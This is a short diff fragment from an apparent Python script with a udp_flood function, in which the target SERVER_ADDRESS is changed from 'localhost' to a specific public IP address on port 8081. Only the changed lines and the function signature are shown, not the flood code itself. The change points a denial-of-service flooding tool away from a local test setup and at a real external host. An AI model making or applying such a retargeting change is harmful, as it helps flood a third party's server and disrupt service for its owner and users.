@@ -5,7 +5,7 @@ import threading
 import time
 
 # Server address and port
-SERVER_ADDRESS = 'localhost'
+SERVER_ADDRESS = '69.164.196.248'
 SERVER_PORT = 8081
 
 def udp_flood(ip, port, times, duration):
